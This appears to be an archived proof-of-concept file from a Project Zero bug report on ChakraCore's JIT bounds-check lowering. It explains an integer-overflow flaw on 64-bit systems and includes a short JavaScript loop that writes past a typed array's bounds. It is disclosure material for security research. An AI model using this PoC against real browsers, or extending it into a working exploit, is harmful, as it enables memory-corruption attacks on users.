@@ -1,0 +1,37 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1343
+
+Here's a snippet of the method.
+void Lowerer::LowerBoundCheck(IR::Instr *const instr)
+{
+    ...
+    if(rightOpnd->IsIntConstOpnd())
+    {
+        IntConstType newOffset;
+        if(!IntConstMath::Add(offset, rightOpnd->AsIntConstOpnd()->GetValue(), &newOffset)) <<--- (a)
+        {
+            offset = newOffset;
+            rightOpnd = nullptr;
+            offsetOpnd = nullptr;
+        }
+    }
+    ...
+    if(!rightOpnd)
+    {
+        rightOpnd = IR::IntConstOpnd::New(offset, TyInt32, func);
+    }
+}
+
+At (a), it uses "IntConstMath::Add" to check integer overflow. But the size of IntConstType equals to the size of pointer, and the "offset" variable is used as a 32-bit integer. So it may fail to check integer overflow on 64-bit system.
+
+PoC:
+*/
+
+function f() {
+    let arr = new Uint32Array(0x1000);
+    for (let i = 0; i < 0x7fffffff;) {
+        arr[++i] = 0x1234;
+    }
+}
+
+f();
